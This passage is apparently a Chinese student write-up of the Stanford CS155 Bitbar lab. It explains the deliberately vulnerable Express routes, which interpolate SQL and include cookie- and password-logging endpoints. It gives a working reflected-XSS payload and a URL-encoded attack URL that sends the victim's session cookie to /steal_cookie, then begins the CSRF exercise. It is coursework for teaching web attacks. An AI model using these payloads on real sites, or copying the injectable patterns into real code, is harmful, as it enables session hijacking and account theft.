class="subst">$&#123;receiverNewBal&#125;</span>&quot; WHERE username == &quot;<span class="subst">$&#123;receiver.username&#125;</span>&quot;;`</span>;</span><br><span class="line">    <span class="keyword">await</span> db.<span class="title function_">exec</span>(query);</span><br><span class="line">    <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;transfer/success&#x27;</span>, <span class="string">&#x27;Transfer Complete&#x27;</span>, <span class="literal">false</span>, &#123;receiver, amount&#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">// user does not exist</span></span><br><span class="line">    <span class="keyword">let</span> q = req.<span class="property">body</span>.<span class="property">destination_username</span>;</span><br><span class="line">    <span class="keyword">if</span> (q == <span class="literal">null</span>) q = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> oldQ;</span><br><span class="line">    <span class="keyword">while</span> (q !== oldQ) &#123;</span><br><span class="line">      oldQ = q;</span><br><span class="line">      q = q.<span class="title function_">replace</span>(<span class="regexp">/script|SCRIPT|img|IMG/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;transfer/form&#x27;</span>, <span class="string">&#x27;Transfer Bitbars&#x27;</span>, <span class="string">`User <span class="subst">$&#123;q&#125;</span> does not exist!`</span>, &#123;<span class="attr">receiver</span>:<span class="literal">null</span>, <span class="attr">amount</span>:<span class="literal">null</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<p>在post路由中，asyncMiddleware是一个自定义中间件，用于处理异步操作中的错误。这样，如果在异步操作中发生错误，它会被捕获并通过Express的错误处理机制进行处理，而不会导致服务器崩溃。</p>
<p>get方法是Express框架提供的一种方式，用于定义处理HTTP GET请求的路由。HTTP GET请求通常用于请求数据，如页面、图片或特定资源的信息。在这个路由文件中，get方法被用于多个不同的路由，每个路由处理不同的路径和逻辑。</p>
<h5 id="根路径-路由"><a href="#根路径-路由" class="headerlink" title="根路径 &#x2F; 路由"></a>根路径 &#x2F; 路由</h5><p>当用户访问网站的根路径时，这个路由会被触发，渲染并返回首页。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;Bitbar Home&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="login-路由"><a href="#login-路由" class="headerlink" title="&#x2F;login 路由"></a>&#x2F;login 路由</h5><p>这个路由处理用户访问登录表单的请求，渲染并返回登录表单页面。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;login/form&#x27;</span>, <span class="string">&#x27;Login&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="get-login-路由"><a href="#get-login-路由" class="headerlink" title="&#x2F;get_login 路由"></a>&#x2F;get_login 路由</h5><p>这个路由处理用户的登录尝试。它从数据库中查询用户信息，验证密码，然后根据验证结果决定是否登录用户。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/get_login&#x27;</span>, <span class="title function_">asyncMiddleware</span>(<span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> db = <span class="keyword">await</span> dbPromise;</span><br><span class="line">  <span class="keyword">const</span> query = <span class="string">`SELECT * FROM Users WHERE username == &quot;<span class="subst">$&#123;req.query.username&#125;</span>&quot;;`</span>;</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> db.<span class="title function_">get</span>(query);</span><br><span class="line">  <span class="keyword">if</span>(result) &#123; <span class="comment">// if this username actually exists</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">checkPassword</span>(req.<span class="property">query</span>.<span class="property">password</span>, result)) &#123; <span class="comment">// if password is valid</span></span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">2000</span>);</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">loggedIn</span> = <span class="literal">true</span>;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">account</span> = result;</span><br><span class="line">      <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;login/success&#x27;</span>, <span class="string">&#x27;Bitbar Home&#x27;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;login/form&#x27;</span>, <span class="string">&#x27;Login&#x27;</span>, <span class="string">&#x27;This username and password combination does not exist!&#x27;</span>);</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<h5 id="register-路由"><a href="#register-路由" class="headerlink" title="&#x2F;register 路由"></a>&#x2F;register 路由</h5><p>当用户想要注册新账户时，这个路由会被触发，渲染并返回注册表单页面。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;register/form&#x27;</span>, <span class="string">&#x27;Register&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="close-路由"><a href="#close-路由" class="headerlink" title="&#x2F;close 路由"></a>&#x2F;close 路由</h5><p>这个路由允许已登录的用户删除他们的账户。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/close&#x27;</span>, <span class="title function_">asyncMiddleware</span>(<span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">loggedIn</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;login/form&#x27;</span>, <span class="string">&#x27;Login&#x27;</span>, <span class="string">&#x27;You must be logged in to use this feature!&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> db = <span class="keyword">await</span> dbPromise;</span><br><span class="line">  <span class="keyword">const</span> query = <span class="string">`DELETE FROM Users WHERE username == &quot;<span class="subst">$&#123;req.session.account.username&#125;</span>&quot;;`</span>;</span><br><span class="line">  <span class="keyword">await</span> db.<span class="title function_">get</span>(query);</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">loggedIn</span> = <span class="literal">false</span>;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">account</span> = &#123;&#125;;</span><br><span class="line">  <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;Bitbar Home&#x27;</span>, <span class="string">&#x27;Deleted account successfully!&#x27;</span>);</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<h5 id="logout-路由"><a href="#logout-路由" class="headerlink" title="&#x2F;logout 路由"></a>&#x2F;logout 路由</h5><p>这个路由处理用户的登出操作，清除用户的会话信息，并返回首页。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">loggedIn</span> = <span class="literal">false</span>;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">account</span> = &#123;&#125;;</span><br><span class="line">  <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;Bitbar Home&#x27;</span>, <span class="string">&#x27;Logged out successfully!&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="profile-路由"><a href="#profile-路由" class="headerlink" title="&#x2F;profile 路由"></a>&#x2F;profile 路由</h5><p>这个路由允许用户查看自己的个人资料或通过用户名查询其他用户的个人资料。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/profile&#x27;</span>, <span class="title function_">asyncMiddleware</span>(<span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">loggedIn</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;login/form&#x27;</span>, <span class="string">&#x27;Login&#x27;</span>, <span class="string">&#x27;You must be logged in to use this feature!&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">query</span>.<span class="property">username</span> != <span class="literal">null</span>) &#123; <span class="comment">// if visitor makes a search query</span></span><br><span class="line">    <span class="keyword">const</span> db = <span class="keyword">await</span> dbPromise;</span><br><span class="line">    <span class="keyword">const</span> query = <span class="string">`SELECT * FROM Users WHERE username == &quot;<span class="subst">$&#123;req.query.username&#125;</span>&quot;;`</span>;</span><br><span class="line">    <span class="keyword">let</span> result;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      result = <span class="keyword">await</span> db.<span class="title function_">get</span>(query);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">      result = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(result) &#123; <span class="comment">// if user exists</span></span><br><span class="line">      <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;profile/view&#x27;</span>, <span class="string">&#x27;View Profile&#x27;</span>, <span class="literal">false</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">// user does not exist</span></span><br><span class="line">      <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;profile/view&#x27;</span>, <span class="string">&#x27;View Profile&#x27;</span>, <span class="string">`<span class="subst">$&#123;req.query.username&#125;</span> does not exist!`</span>, req.<span class="property">session</span>.<span class="property">account</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">// visitor did not make query, show them their own profile</span></span><br><span class="line">    <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;profile/view&#x27;</span>, <span class="string">&#x27;View Profile&#x27;</span>, <span class="literal">false</span>, req.<span class="property">session</span>.<span class="property">account</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<h5 id="transfer-路由"><a href="#transfer-路由" class="headerlink" title="&#x2F;transfer 路由"></a>&#x2F;transfer 路由</h5><p>这个路由为已登录的用户提供了一个表单，用于向其他用户转账。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/transfer&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">loggedIn</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;login/form&#x27;</span>, <span class="string">&#x27;Login&#x27;</span>, <span class="string">&#x27;You must be logged in to use this feature!&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;transfer/form&#x27;</span>, <span class="string">&#x27;Transfer Bitbars&#x27;</span>, <span class="literal">false</span>, &#123;<span class="attr">receiver</span>:<span class="literal">null</span>, <span class="attr">amount</span>:<span class="literal">null</span>&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="steal-cookie-和-steal-password-路由"><a href="#steal-cookie-和-steal-password-路由" class="headerlink" title="&#x2F;steal_cookie 和 &#x2F;steal_password 路由"></a>&#x2F;steal_cookie 和 &#x2F;steal_password 路由</h5><p>这两个路由用于演示或测试目的，用于记录从请求中获取的cookie或密码信息。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/steal_cookie&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> stolenCookie = req.<span class="property">query</span>.<span class="property">cookie</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\n\n&#x27;</span> + stolenCookie + <span class="string">&#x27;\n\n&#x27;</span>);</span><br><span class="line">  <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;theft/view_stolen_cookie&#x27;</span>, <span class="string">&#x27;Cookie Stolen!&#x27;</span>, <span class="literal">false</span>, stolenCookie);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/steal_password&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> password = req.<span class="property">query</span>.<span class="property">password</span>;</span><br><span class="line">  <span class="keyword">let</span> timeElapsed = req.<span class="property">query</span>.<span class="property">timeElapsed</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`\n\nPassword: <span class="subst">$&#123;req.query.password&#125;</span>, time elapsed: <span class="subst">$&#123;req.query.timeElapsed&#125;</span>\n\n`</span>);</span><br><span class="line">  res.<span class="title function_">end</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="其他文件"><a href="#其他文件" class="headerlink" title="其他文件"></a>其他文件</h4><h5 id="view-pages"><a href="#view-pages" class="headerlink" title="view&#x2F;pages"></a>view&#x2F;pages</h5><p>该文件夹中的文件用于页面渲染。</p>
<h5 id="db-migrate-002-add-initial-users-sql"><a href="#db-migrate-002-add-initial-users-sql" class="headerlink" title="db&#x2F;migrate&#x2F;002-add-initial-users.sql"></a>db&#x2F;migrate&#x2F;002-add-initial-users.sql</h5><p>用于存储用户信息，可以在注释中查看密码。</p>
<h2 id="第一部分：攻击方法"><a href="#第一部分：攻击方法" class="headerlink" title="第一部分：攻击方法"></a>第一部分：攻击方法</h2><p>在项目的第一部分，您将开发一系列针对 Bitbar 应用程序的攻击。在每个练习中，我们都会描述您需要向评分器提供哪些输入，以及评分器将使用您的输入采取哪些具体操作。评分员应获得每个练习中描述的结果，您才能获得学分。您的所有攻击都应假定可以通过 URL <a target="_blank" rel="noopener" href="http://localhost:3000/">http://localhost:3000</a> 访问网站。</p>
<p>请注意，我们在 code&#x2F;db&#x2F;migrate&#x2F;002-add-initial-users.sql 中提供了一些初始账户。例如，其中一个账户的用户名为“user1”，密码为“one”。欢迎创建其他账户，但这些账户在每个漏洞的“交付与评分” 部分中都有提及，评分员将使用这些账户运行漏洞。不得使用任何外部库，也不得编辑网络应用程序本身。这尤其意味着您不能使用 jQuery。您可以使用在线资源，但请在您提交的 README.txt 中引用这些资源。</p>
<h3 id="漏洞利用Alpha：Cookie窃取"><a href="#漏洞利用Alpha：Cookie窃取" class="headerlink" title="漏洞利用Alpha：Cookie窃取"></a>漏洞利用Alpha：Cookie窃取</h3><h4 id="攻击要求"><a href="#攻击要求" class="headerlink" title="攻击要求"></a>攻击要求</h4><p>在第一次攻击中，您的目标是窃取登录用户的 Bitbar 会话 cookie，并将其发送到攻击者控制的 URL。您需要创建以 <a target="_blank" rel="noopener" href="http://localhost:3000/profile?username=">http://localhost:3000/profile?username=</a> 开头的 URL，在访问时将窃取的 cookie 发送到 <a target="_blank" rel="noopener" href="http://localhost:3000/steal_cookie?cookie=%5B%E6%AD%A4%E5%A4%84%E7%AA%83%E5%8F%96%E7%9A%84">http://localhost:3000/steal_cookie?cookie=[此处窃取的</a> cookie]。攻击成功后，服务器会将窃取的 cookie 记录到终端输出中。</p>
<p><strong>重要提示：</strong> 用户不应明显察觉到攻击。这意味着网站的外观不应有任何变化，无关的文本也不可见。除了浏览器位置栏（可以是不同的），评分者在访问其个人资料时看到的页面应该是正常的。避免出现“未找到用户” 的蓝色警告文字是攻击的一个重要部分。如果显示的Bitbars数量或个人资料的内容不正确（只要看起来“正常”），也没有关系。如果页面在自我纠正之前短暂看起来很奇怪也没关系。</p>
<p><strong>交付和评分：</strong> 您需要提交一个名为 a.txt 的文件，其中只包含您的恶意 URL。评分者将user1的身份登录Bitbar，并进入profile。在这里，评分员将在地址栏上复制您的URL并进行导航。您可以通过在终端输出中查找被盗cookie来验证解决方案是否有效。</p>
<p><em>提示：</em> 尝试在 URL 结尾添加随机文本。这会如何改变页面的 HTML？</p>
<h4 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h4><h5 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h5><p>XSS，跨站脚本(Cross Site Scripting) ，为了不和层叠样式表(Cascading Style Sheets)的缩写CSS混合，所以改名为XSS。攻击者会向web页面(input表单、URL、留言版等位置)插入恶意JavaScript代码，导致管理员&#x2F;用户访问时触发，从而达到攻击者的目的。简单来说就是，服务器对用户提交的数据过滤不严，导致浏览器把用户的输入当成了JS代码并直接返回给客户端执行，从而实现对客户端的攻击目的。</p>
<h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><h5 id="Cookie形式探究"><a href="#Cookie形式探究" class="headerlink" title="Cookie形式探究"></a>Cookie形式探究</h5><p>为了进行Cookie窃取，可以通过抓包了解Cookie在bitbar中的具体表现形式。登录user1并抓包：<br><img src="figure/attack1_1.png" alt="attack1_1" style="zoom: 50%;" /> </p>
<p>可以看到：</p>
<ol>
<li>处理登录的 URL 是 &#x2F;get_login，表单提交方式是 GET，传入参数是 username&#x3D;user1 和 password&#x3D;one；</li>
<li>Refer 字段表示请求访问的来源是 <a target="_blank" rel="noopener" href="http://localhost:3000/login">http://localhost:3000/login</a> ，意思是由 &#x2F;login 页面提交表单并交付&#x2F;get_login处理；</li>
<li>Cookie 字段表示页面的 Cookie 信息，只有一个 session 值，这是要窃取的 Cookie。对 session 的值进行 base64 解码，得到{“𝑙𝑜𝑔𝑔𝑒𝑑𝐼𝑛” ∶ 𝑓𝑎𝑙𝑠𝑒, “𝑎𝑐𝑐𝑜𝑢𝑛𝑡” ∶{}} ，与 &#x2F;get_login 的处理结果相同。</li>
</ol>
<h5 id="XSS攻击测试"><a href="#XSS攻击测试" class="headerlink" title="XSS攻击测试"></a>XSS攻击测试</h5><p>打开开始网址：<a target="_blank" rel="noopener" href="http://localhost:3000/profile?username=">http://localhost:3000/profile?username=</a><br>原本功能应该是输入文件名查看文件，测试user1，可见是get方法发送request。<br><img src="/figure/attack1_2.png" alt="attack1_2"> </p>
<p>测试发现存在XSS漏洞，可以直接执行js代码。</p>
<p>测试方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，然后出现弹窗，发现在url中代码直接就显示出来了，说明没有过滤、html编码等，存在xss漏洞。<br><img src="/figure/attack1_3.png" alt="attack1_3"> </p>
<h5 id="窃取cookie"><a href="#窃取cookie" class="headerlink" title="窃取cookie"></a>窃取cookie</h5><p>题目说明user1已经登录bitbar，打开目标网页，故会话cookie此时已经存在user1的浏览器，直接使用document.cookie属性就可以获取字符串格式的cookie.<br><img src="/figure/attack1_cookie.png" alt="attack1_cookie"> </p>
<p>题目说明获取cookie后发送到<br><a target="_blank" rel="noopener" href="http://localhost:3000/steal_cookie?cookie=%5Bcookie_data_here%5D">http://localhost:3000/steal_cookie?cookie=[cookie_data_here]</a><br>这里也是get方法，?后为参数，字符串形式。</p>
<p>因此，恶意代码的构造思路为：</p>
<ol>
<li>获取user1的cookie；</li>
<li>将 cookie 参数传递给 &#x2F;steal_cookie</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> ck=<span class="variable language_">document</span>.<span class="property">cookie</span>; </span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">`/steal_cookie?cookie=<span class="subst">$&#123;ck&#125;</span>`</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>将这段代码注入到文件搜索框，在终端即可查看窃取的cookie：<br><img src="/figure/attack1_4.png" alt="attack1_4"> </p>
<p>网址运行效果：<br><img src="/figure/attack1_5.png" alt="attack1_5"></p>
<p>a.txt:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/profile?username=%3Cscript%3Evar+ck%3Ddocument.cookie%3Bwindow.location.replace%28%60%2Fsteal_cookie%3Fcookie%3D%24%7Bck%7D%60%29%3B%3C%2Fscript%3E</span><br></pre></td></tr></table></figure>

<p> 如果在URL末尾添加随机文本，窃取的cookie末尾也会显示该随机文本：<br> <img src="/figure/attack1_6.png" alt="attack1_6"></p>
<h3 id="漏洞利用Bravo：跨站请求伪造"><a href="#漏洞利用Bravo：跨站请求伪造" class="headerlink" title="漏洞利用Bravo：跨站请求伪造"></a>漏洞利用Bravo：跨站请求伪造</h3><h4 id="实验任务说明"><a href="#实验任务说明" class="headerlink" title="实验任务说明"></a>实验任务说明</h4><p>在第二次攻击中，您将构建跨站请求伪造（CSRF）攻击，从其他用户处窃取Bitbar。您将专门创建一个恶意网站，当受害者访问该网站时，网站会从其账户中窃取 10 个比特条并存入您的攻击者账户。<br>您提交的攻击是一个独立的 HTML 页面 (b.html)，可将 10 个 Bitbars 从评分者的登录账户转移到攻击者的用户账户。转账完成后，您的攻击网站应立即将用户重定向到<a target="_blank" rel="noopener" href="https://cs155.stanford.edu/">https://cs155.stanford.edu/</a> 。这个过程应该足够快，正常用户不会注意到。<br><strong>重要提示：</strong> 浏览器的位置栏在任何时候都不应包含localhost:3000，因为这可能会让受害者察觉到攻击。<br><strong>交付和评分：</strong> 您需要提交一个包含漏洞的独立 HTML 文件 b.html。评分者将先登录 Bitbar，然后在网络浏览器上加载 b.html。评分员将检查：(1) 是否有10个 Bitbar 从其账户转到攻击者账户；(2) 攻击者网站是否立即重定向到 CS155 网站；(3) 网页浏览器是否从未直接访问过 localhost:3000。</p>
<h4 id="实验原理-1"><a href="#实验原理-1" class="headerlink" title="实验原理"></a>实验原理</h4><h5 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h5><p>CSRF（Cross-Site Request Forgery），即跨站请求伪造，也被称为“one-click attack”或“session riding”，是一种网络攻击方式。攻击者通过诱导用户在不知情的情况下，利用用户已经认证的身份，在用户不知情的情况下执行非预期的操作，比如在网站上发起恶意请求。<br>这种攻击的关键在于，攻击者构造的请求是从用户已经登录的、并且信任的网站上发出的。由于 Web 应用通常会信任已经认证的用户发出的请求，因此攻击者可以利用这一点来执行未经授权的操作，如修改用户设置、转账、发布内容等。</p>
<h4 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h4><h5 id="转账表单探究"><a href="#转账表单探究" class="headerlink" title="转账表单探究"></a>转账表单探究</h5><p>可以在views&#x2F;pages&#x2F;transfer&#x2F;form.ejs中查看表单转发形式，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;h3&gt;<span class="title class_">Transfer</span> <span class="title class_">Bitbars</span>&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;pure-form pure-form-stacked&quot;</span> <span class="attr">action</span>=<span class="string">&quot;post_transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;% if(errorMsg) &#123; %&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&#x27;error&#x27;</span>&gt;</span> &lt;%- errorMsg %&gt; <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;% &#125; %&gt;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">	<span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">		You currently have &lt;%= account.bitbars %&gt; bitbars.</span></span><br><span class="line"><span class="language-xml">	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;destination_username&quot;</span>&gt;</span>Transfer to<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;destination_username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;%= result.receiver %&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;quantity&quot;</span>&gt;</span>Amount<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;quantity&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;%= result.amount %&gt;&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pure-button button-primary&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Transfer&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
